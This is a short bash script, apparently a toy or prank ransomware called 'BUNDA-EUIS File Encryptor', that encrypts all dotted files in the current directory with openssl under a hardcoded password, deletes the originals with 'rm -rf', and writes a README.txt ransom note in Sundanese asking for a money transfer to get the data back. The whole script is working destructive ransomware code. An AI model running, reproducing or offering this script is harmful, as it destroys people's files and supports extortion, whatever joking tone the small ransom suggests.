#!/bin/bash
# BUNDA-EUIS File Encryptor v.1
# Created by Prima Setiawan / Joe Heartless

# echo -n "[Insert password to protect files:] " # <-- Manual input password openssl -k
# read passwed
# echo -n "[File extension to encryp (ex: dat, xls, php, sql, '*' for all files in $(pwd)]: "
# read ext
file=$(ls -f *.*)
i=1
for enc in $file 
do 
	echo "[$i] File $enc encrypted"
	openssl enc -aes-256-cbc -in $enc -out bunda.$enc -pbkdf2 -k bundaeuisgeulis # <-- $passwed
	file[i]=$enc
	i=$(( i + 1 ))
done
# echo "Removing original file..."
rm -rf $file
echo "Nuhun bund... kabeh data di PC ieu' urang enkripsi, lamun bunda hoyong datana balik, sok transfer sarebu rupiah" > README.txt
sleep 1
echo "--------------------------------------------------------------------------------------------------------------------------------------"
ls
